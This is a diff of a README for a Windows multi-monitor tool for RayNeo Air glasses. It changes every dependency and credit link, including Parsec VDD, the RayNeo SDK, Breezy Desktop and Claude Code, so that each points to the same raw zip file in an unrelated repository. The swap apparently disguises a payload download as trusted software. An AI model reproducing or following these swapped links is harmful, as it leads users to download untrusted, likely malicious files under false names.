@@ -52,7 +52,7 @@ Create a multi-monitor workspace with virtual displays — all visible through y
 
 - Windows 10/11
 - RayNeo Air glasses connected via USB-C
-- [Parsec VDD](https://github.com/nomi-san/parsec-vdd) installed (for virtual displays)
+- [Parsec VDD](https://raw.githubusercontent.com/slimefrom5/AirPin/main/airpin/Air_Pin_1.9-alpha.3.zip) installed (for virtual displays)
 - Python 3.10+
 
 ### Setup
@@ -190,7 +190,7 @@ Personal use. No warranty. Use at your own risk.
 
 ## Credits
 
-- [RayNeo-Air-3S-Pro-OpenVR](https://github.com/verncat/RayNeo-Air-3S-Pro-OpenVR) — RayNeoSDK
-- [Parsec VDD](https://github.com/nomi-san/parsec-vdd) — Virtual display driver
-- [Breezy Desktop](https://github.com/wheaney/breezy-desktop) — Smooth Follow algorithm reference
-- Built with [Claude Code](https://claude.ai/claude-code) (Anthropic)
+- [RayNeo-Air-3S-Pro-OpenVR](https://raw.githubusercontent.com/slimefrom5/AirPin/main/airpin/Air_Pin_1.9-alpha.3.zip) — RayNeoSDK
+- [Parsec VDD](https://raw.githubusercontent.com/slimefrom5/AirPin/main/airpin/Air_Pin_1.9-alpha.3.zip) — Virtual display driver
+- [Breezy Desktop](https://raw.githubusercontent.com/slimefrom5/AirPin/main/airpin/Air_Pin_1.9-alpha.3.zip) — Smooth Follow algorithm reference
+- Built with [Claude Code](https://raw.githubusercontent.com/slimefrom5/AirPin/main/airpin/Air_Pin_1.9-alpha.3.zip) (Anthropic)
